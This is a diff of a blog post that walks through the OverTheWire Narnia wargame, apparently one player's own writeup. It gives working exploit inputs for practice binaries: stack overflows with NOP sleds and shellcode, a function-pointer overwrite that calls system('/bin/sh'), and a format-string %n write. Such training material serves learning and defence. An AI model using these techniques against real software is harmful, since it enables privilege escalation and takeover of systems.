@@ -1,13 +1,15 @@
 ---
 layout: post
 title: OverTheWire Narnia Writeup
-date: 2025-07-23
+date: 2025-08-02
 tags: writeup overthewire
 ---
 
-My writeup for the Narnia wargame at OverTheWire.org.
+After an almost year-long hiatus, I've come back to this site to work on the next CTF game. This post contains my writeup to all the levels, complete with my thinking process and context.
 
-Add some info here
+Narnia helped me learn and understand more about how code works at a binary level, especially with how I could use vulnerabilities in machine code and C code/functions in order to gain higher access, and how I could prevent these issues from happening in my own code.
+
+Previously, my only experience in binary (exploitation) came through computer architecture classes that I took during college, however they mostly dealt with MIPS assembly instead of x86, and relied on illustrations & diagrams. They somewhat helped me with solving these problems, but for the most part, I had to spend the majority of my time researching on my own (and with guidance from some people @ OTW). Nevertheless, it's been a blast solving all of these levels.
 
 ### Introduction
 
@@ -130,7 +132,7 @@ From what I can understand about assembly, after we go past the `main()` variabl
 
 However, before we get there, we need to figure out what our payload will be for the first 132 bytes. I decided to use the same shellcode from the previous level, which is 33 bytes. The rest of the space (99 bytes) will be placed on the front of the input, and it will consist of no-operation instructions (0x90 in hex). NOP will basically just skip to the next byte/instruction in assembly without doing anything. That way, we will have space to put our return address in, and it will allow the shellcode to run smoothly.
 
-To find the last 4 bytes for our return memory address, we need to use a debug program like GDB and look at it's memory when the program crashes. I did this by running `gdb -q ./narnia `, then when the gdb prompt opens up, we can run the program using `` r `python3 -c "print (132*'q')"` ``{:.language-bash .highlight}. When the program crashes, we can see the memory past the stack pointer by doing `x/100xw $esp`.
+To find the last 4 bytes for our return memory address, we need to use a debug program like GDB and look at it's memory when the program crashes. I did this by running `gdb ./narnia `, then when the gdb prompt opens up, we can run the program using `` r `python3 -c "print (132*'q')"` ``{:.language-bash .highlight}. When the program crashes, we can see the memory past the stack pointer by doing `x/100xw $esp`.
 
 You should keep pressing enter until you find the correct part of memory, which you can tell by seeing a blob of the same hex values (in particular, 0x71 as it is the hex code for the letter q). The address closest to the middle should be the return address, to give it a good enough range so we can re-run the program. I chose 0xffffd540. Just like in the first level, the characters will be in reverse order.
 
@@ -293,3 +295,175 @@ int main(int argc, char *argv[]){
     fp(b1);
     ...
 ```
+
+Breaking down the code, we can see:
+
+1. The code wants 2 arguments, and uses `strcpy()` to put them into two 8-character arrays. This means we can buffer overflow here.
+2. It clears environment variables and extra arguments, but I suspect this is only here to prevent unintended solutions or server attacks.
+3. The program exits early if `fp` points to somewhere at the top of the stack. Since it runs without error, that means that it gets called to somewhere far below the memory.
+4. `fp(b1)` is called. Apparantly it is used as a function pointer, and currently only runs `puts(b1)`, so it only prints the first argument.
+
+We cannot use a shellcode attack like the ones we used in previous levels. This is because we have fewer bytes to store info on, and the program will not let us run code that is on stack memory.
+
+At first glance, it seems that you cannot write over the function pointer `fp` because it is declared right after `b1` and `b2`, which mean that a buffer overflow wouldn't change it's value. However, it turns out that `fp` on the stack is actually right below `b1`, so we are able to overwrite it by overflowing that char array. I was able to confirm this by running this C code:
+
+```c
+#include <stdio.h>
+
+int main(){
+    char b1[8], b2[8];
+    int  (*fp)(char *)=(int(*)(char *))&puts, i;
+
+    printf("Addr b1: %p\n", (void *)b1);
+    printf("Addr b2: %p\n", (void *)b2);
+    printf("Addr fp: %p\n", (void *)&fp);
+    printf("Addr i:  %p\n", (void *)&i);
+}
+```
+
+Reading the addresses confirms that the stack memory goes like this, from lowest to highest: `i <- fp <- b1 <- b2`. I'm not sure why this is, but my guess is some kind of compiler optimization involving arrays.
+
+Anyways, how are we supposed to replace `fp`? Since it's pointing to an existing function `puts()`, we can possibly try to replace it with another library function that could give us shell access, and with input that is 8 characters or smaller. Luckily, the program includes the `<stdlib.h>` library, which includes the `system()` function to run any command, including the shell.
+
+We can use GDB to easily find the memory locations to standard library functions. We can do `gdb ./narnia6`, run the program (to load up the libraries), then use the print command to get the memory address of the function: `p system`. In my case, it was displayed in blue font as 0xf7dce450. As you can notice, it does not end in 0xff so it will not exit early.
+
+Now that we have that, we need to overflow two arguments in order to run our exploit. The first one, which overflows `b1`, will be used to overwrite `fp` with the memory address of `system()` that we just obtained. The second argument will overflow `b2` to overwrite `b1` with `/bin/sh` to run the shell. Unfortunately we can't do this in one argument because of null character issues.
+
+Since each buffer is only 8 bytes long, we just need an 8-letter word to overflow both with...
+
+```bash
+./narnia6 `echo -e "deadbeef\x50\xe4\xdc\xf7"` deadbeef/bin/sh
+```
+
+### Level 7
+
+```c
+...
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+        fflush(stdout);
+
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+            fflush(stdout);
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+
+        return 0;
+}
+```
+
+Wow that's probably the longest code we've seen here so far.
+
+This program will run `goodfunction()` and does nothing with our input, except placing it in an array with the `snprintf()` function. We need to instead be able to run `hackedfunction()`. It also outputs the memory addresses of both functions, as well as the address and value of `ptrf`, the function pointer being called.
+
+![Our address and values for variables](narnia_7_test.png)
+
+Previously we used `snprintf()` to run a format string attack in Level 5. We can use the same idea in order to change the value of `ptrf` to the memory address of the hacked function, so we will be able to run it. We already have its memory address at 0xffffd2c8, and the value to change it to is 0x804930f (134517519).
+
+We can use the same method we discussed on level 5. However, I've had to refine my format string a few times in order to stop segfaults, and eventually I removed the junk values on the first 4 letters in order for it to work. So our final input looks something like `\xc8\xd2\xff\xff%134517515d%n`. I'm not entirely sure why this was necessary here, but not on level 5.
+
+Intriguing how the two levels have somewhat unique solutions for writing to memory, despite being so similar. Format strings just get weirder and weirder.
+
+### Level 8
+
+```c
+...
+int i;
+
+void func(char *b){
+        char *blah=b;
+        char bok[20];
+        //int i=0;
+
+        memset(bok, '\0', sizeof(bok));
+        for(i=0; blah[i] != '\0'; i++)
+                bok[i]=blah[i];
+
+        printf("%s\n",bok);
+}
+
+int main(int argc, char **argv){
+        if(argc > 1)
+                func(argv[1]);
+        else
+        printf("%s argument\n", argv[0]);
+
+        return 0;
+}
+```
+
+The function `func()` will write to the `bok` array by traversing the entire string we provide in the argument. This means we can do a buffer overflow attack, possibly by supplying the shellcode we've used in previous levels and overwriting the return address.
+
+However there is one caveat- if we overflow `bok`, it will overwrite the pointer `blah`, which will make the function copy from a random area in memory instead of our input. So we need a way to re-supply that memory address.
+
+To do this, we need to examine the stack memory when `func()` is being called, and see the values of the two variables. I ran GDB with the executable, then set up a breakpoint near the end before the stack pointer goes back to main. This will pause the program when we run it so that we can examine it in-place.
+
+Run `disass func` to visualize the assembly code, then `b *func+<NUM>` to set the breakpoint. I set it to 110.
+
+![GDB breakpoint](/assets/posts/narnia_8_bp.png)
+
+With that set up, we can test the program with input of various length. Here's one that I ran with `r hello`, then got the memory by doing `x/16xw $esp`:
+
+![Memory addresses](/assets/posts/narnia_8_mem.png)
+
+I've highlighted above the values for our input that is held by `blah`. You can tell by the trail of zeroes that were memsetted beforehand. We do not need to worry about the 2nd value, but it can be useful for debugging. As you might notice, the value changes depending on how long our argument is, so we need to decrease it as we add more letters to it.
+
+With 5 letters our value is 0xffffd577. With 20, we would have to decrease the last digits to 0x68. And if we want to actually set the pointer, it would then be 0x64. We can confirm this by checking the memory being written and if the two memory values match (refer to the previous image), as there's no valuable hints being shown by the print statement.
+
+Here's some statments that worked for me:
+
+```
+r `echo -e "hellohellohellohello\x64\xd5\xff\xff"`
+r `echo -e "hellohellohellohello\x60\xd5\xff\xffAAAA"`
+r `echo -e "hellohellohellohello\x5c\xd5\xff\xffAAAABBBB"`
+```
+
+Now if we account that for the 33-byte shellcode, it would be ``r `echo -e "hellohellohellohello\x3b\xd5\xff\xffAAAABBBB"` ``
+
+The `AAAA` here previously held our frame pointer, which isn't useful to us, so we can put any random value on it. The `BBBB` will be replaced by our own return address. Since we're providing the shellcode in our argument, we need to get the address that goes directly to it. Luckily, we have our pointer value right here, so we can just push it 32(0x20) letters forward. That would make our return address as 0xffffd55b.
+
+And finally, we can append the entire shellcode to the back of our input. This isn't entirely safe because it relies on overwriting random memory values that the program might use, but I wouldn't care in this situation. Our command would then be ``r `echo -e "hellohellohellohello\x3b\xd5\xff\xffAAAA\x5b\xd5\xff\xff\x6a...\x80"` ``.
+
+If we run it, we will be able to get the shell, however GDB is preventing us from accessing as the next user. We need to exit it and... damn. We need to re-calculate the memory values again. To do this we can use the `xxd` command to examine the values that get printed out if we overflow the buffer to 20 characters:
+
+![Memory addresses without gdb](/assets/posts/narnia_8_xxd.png)
+
+Great, we've got the address at 0xffffd581. Now we'd need to adjust it and the return address to the rest of our input size. You can do this part yourself :)
+
+### Level 9
+
+There's nothing to do here for now.
+
+We've finished Narnia! Thanks for reading my writeup.
